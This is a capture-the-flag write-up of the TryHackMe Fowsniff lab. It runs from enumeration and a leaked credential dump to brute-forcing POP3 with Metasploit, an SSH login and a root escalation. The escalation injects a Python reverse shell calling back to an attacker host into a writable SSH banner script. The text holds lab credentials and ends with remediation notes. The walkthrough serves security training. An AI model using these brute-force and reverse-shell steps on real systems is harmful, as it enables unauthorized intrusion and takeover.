# Lab Report - Fowsniff


# Overview 
---
- **Difficulty**: Easy
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/ctf
- **Tags**: #enumeration #Brute-force #privesc 

## Challenge Description 
---
>**Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!**

## Resolution Summary 
---
**We enumerated services with `Nmap`. Next we investigated the HTTP website on port 80, which revealed that the company suffered a data breach, leading to a set of leaked credentials being discovered. After that, we attempted to brute the `POP3` login page, which allowed us to recover emails indicating the SSH password (+ that a user did not change it). Finally, after gaining access to the SSH server, we obtained a root shell by editing the executable displaying the SSH banner (we had to re-log into the SHH server for the script to be executed again).** 

# Information Gathering 
---
- **To begin with, we performed an `Nmap` scan in order to find available services, we used the `-sV` flag to look for version-related vulnerabilities:**
```bash
sudo nmap -sV 10.10.39.126
```
	-Note: Adding the -p- flag did not provide additional results. 

- **We uncovered the following services:** 
```bash 
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
```

- **We started by investing the HTTP (80) server.** 

## HTTP (80)
---
- **From inspecting the web page we understand that the corporation suffered a data breach, which lead to employees' credentials being exposed.**  
- **We also learned that their twitter/X account was hijacked. Hence, we searched the  twitter/X account for potential hints/leaks from the attack.** 

- **On their account, we found a `pastebin` link for the credentials dump. However, it has been deleted.** 
- **In order to access this resource, we resorted to the [Wayback Machine](https://web.archive.org/web/20220307210821/https://pastebin.com/NrAqVeeX). Then we could access the credentials.** 

- **Finally, we were also hinted to go for the POP3 (110) service. We could use those credentials to access the POP3 mail server.** 

# Exploitation 
---
## HTTP (80)
---
- **Before exploiting the POP3 server, we proceeded by cracking the passwords hashes.**
- **For that we used [Hashes.com](https://hashes.com/en/decrypt/hash).** 

- **From there we created two files :**
	- Password file: `pass.txt`
	- User file: `mail.txt`

- **Next, we moved on and went for the email server.** 
## POP3 (110)
---
- **Since we had a list of credentials (emails + passwords), we attempted to brute force the POP3 login.** 
- **For that purpose, we used the `Metasploit` framework, and more specifically the `scanner/pop3/pop3_login` module.** 

- **First, we launched `Metasploit`:**
```bash
msfconsole 
```

- **We selected the POP3 login module:**
```bash
use scanner/pop3/pop3_login
```

- **We set the required options:** 
```bash
show options #To display options to fill.
set rhosts 10.10.39.126
set user_file /home/kali/user.txt 
set pass_file /home/kali/pass.txt
run #To launch the brute-force attack.
```

- **We found a valid pair of credentials:** 
	- Valid credentials: `seina:scoobydoo2`

- **We logged in the POP3 server using `telnet`:**
```bash
telnet 10.10.39.126 110
#Once we accessed the server
user seina #Then we pressed Enter
pass scoobydoo2 #Then we pressed Enter again
```

- **We started by listing the available mails with `list`, then we used the following to retrieve the mails' content:**
```bash
RETR [number]
```

- **In on of the emails we found a 'temporary' SSH password, which may be worth using when trying to log into the SSH server:**
	- Password: `S1ck3nBluff+secureshell`

- **From the second email, we found a user that had not yet read the email which required from the members to change their SSH password:**
	- Username: `baksteen` 

- **Next, we attempted to connect over SSH.**

## SSH (22)
---
- **Using the previous credentials and the following command, we gained access to the SSH server:** 
```bash
ssh baksteen@10.10.39.126 
#Password : S1ck3nBluff+secureshell 
```

# Privilege Escalation 
---

- **We used the `id` command to get our user's id, then we looked for files we were able to execute:** 
```bash
id 
#Result : we belong to the user group
find / -group users -type f 2>/dev/null 
```

- **We found an executable named `cube.sh` that we could modify and which happened to be the SSH banner (runs once a user logs in), hence we injected a reverse shell in it:**
```bash
nano /opt/cube/cube.sh

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.139.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- **Next, we set up a listener on our machine to catch the reverse shell:**
```bash
nc -lnvp 1234
```

- **Since this file runs each time someone connects over SSH (SSH banner), we attempt to re-log into the SSH server to gain a root shell.** 
- **Once we gained our shell, we verified that we had root privileges with:**
```bash
whoami
#Result: root
```


# Remediation Summary
---
- **Misconfigured File permissions**: Here there is an executable that runs as root that can be modified by our user (not privileged). 
- **Data Leaked**: Passwords on all services should have been rotated.
- **Communicating Passwords insecurely**: If an attacker had foothold on the POP3 server, he could have used MITM attack to intercept data (here password sent) in cleartext since POP3 service is not encrypted. 

# Lessons Learned
---
- **SSH Banner executable**: It is an important detail that can be easily missed.
- **Threads in Metasploit modules**: Increase number of threads for faster results. 
- **Data breaches**: It may reveal valid credentials (gain initial foothold). 
- **Wayback Machine**: It can help recover information that has been deleted (here a pastebin with password hashes). 
